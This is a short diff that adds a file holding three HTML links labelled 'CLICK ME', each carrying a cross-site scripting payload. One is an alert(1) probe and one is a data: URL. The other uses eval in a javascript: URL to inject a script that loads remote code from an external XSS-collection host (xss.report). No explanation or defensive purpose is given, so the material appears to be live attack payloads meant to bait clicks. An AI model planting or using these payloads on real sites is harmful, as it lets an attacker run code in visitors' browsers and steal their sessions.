@@ -1,0 +1,27 @@
+
+
+
+
+
+
+
+
+
+<a href=javascript:alert(1);>CLICK MEEEEEEEEEEEE</a>
+
+
+
+
+
+
+
+
+
+
+
+
+<a href=javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/zh\';document.body.appendChild(a)')>CLICK MEEEEEEEEEEEEa</a>
+
+
+
+<a href=data:text/html,%3Cimg%20src%3Dx%3E%3Cinput%3E>CLICK MEEEEEEEEEEEEx</a>
